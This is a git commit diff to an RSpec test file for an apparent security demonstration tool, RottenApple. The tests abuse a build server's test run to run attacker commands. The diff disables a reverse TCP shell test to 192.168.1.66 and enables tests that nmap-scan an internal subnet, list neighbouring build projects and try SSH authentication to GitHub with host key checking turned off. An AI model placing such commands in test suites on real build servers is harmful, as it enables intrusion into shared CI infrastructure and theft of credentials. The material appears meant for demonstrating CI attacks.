30e33c1edea325cbc9303a638fd7a0db263c11c5
Jonathan Claudius <jclaudius@trustwave.com>
2013-04-14 17:10:53 -0500

    Enable all checks for demo output

--- spec/rotten_apple_spec.rb
+++ spec/rotten_apple_spec.rb
@@ -11,21 +11,21 @@ describe RottenApple::Attack do
     its(:class) {should == RottenApple::Attack}
     
     # A change 13
-    it "should throw a reverse tcp shell" do
-     subject.reverse_shell('192.168.1.66', 443)
+    #it "should throw a reverse tcp shell" do
+    # subject.reverse_shell('192.168.1.66', 443)
+    #end
+
+    it "should perform an NMAP scan" do
+      subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
     end
 
-    #it "should perform an NMAP scan" do
-    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
-    #end
+    it "should list the other projects built on this server" do
+      subject.command('ls ../../')
+    end
 
-    #it "should list the other projects built on this server" do
-    #  subject.command('ls ../../')
-    #end
-
-    #it "should allow me to authenticate to github" do
-    #  subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
-    #end
+    it "should allow me to authenticate to github" do
+      subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
+    end
   end
 
 end
